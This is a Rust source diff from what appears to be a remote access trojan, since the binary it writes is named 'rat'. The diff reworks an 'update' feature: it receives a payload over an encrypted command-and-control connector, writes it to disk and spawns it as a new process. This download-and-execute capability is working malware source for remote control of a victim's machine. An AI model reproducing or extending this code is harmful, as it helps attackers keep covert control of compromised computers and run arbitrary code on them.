@@ -1,6 +1,9 @@
+use std::result;
+
 use tokio::{
     fs::{self, OpenOptions},
     io::AsyncWriteExt,
+    process::Command,
 };
 
 use crate::connector::{hybrid_decryption::HybridDecryption, Connector};
@@ -15,15 +18,18 @@ impl Feature for Update {
         "update".to_string()
     }
     async fn run(&self, connector: &mut Connector) -> Result {
-        while connector.accept_message().await != "stop_file_transfer" {
-            fs::write("rat", connector.accept_message().await.as_bytes())
-                .await
-                .unwrap();
-        }
+        let path_to_program = String::from("rat");
+        fs::write(path_to_program.clone(), connector.accept_message().await)
+            .await
+            .unwrap();
         //launch it
-
-        //check if its running somehow idono
-        Result::SUCCESFUL
+        if let Ok(result) = Command::new(path_to_program).spawn() {
+            println!("Started process with PID: {}", result.id().unwrap());
+            //check if its running somehow idono
+            Result::SUCCESFUL
+        } else {
+            Result::FAILED
+        }
     }
 }
 impl Update {
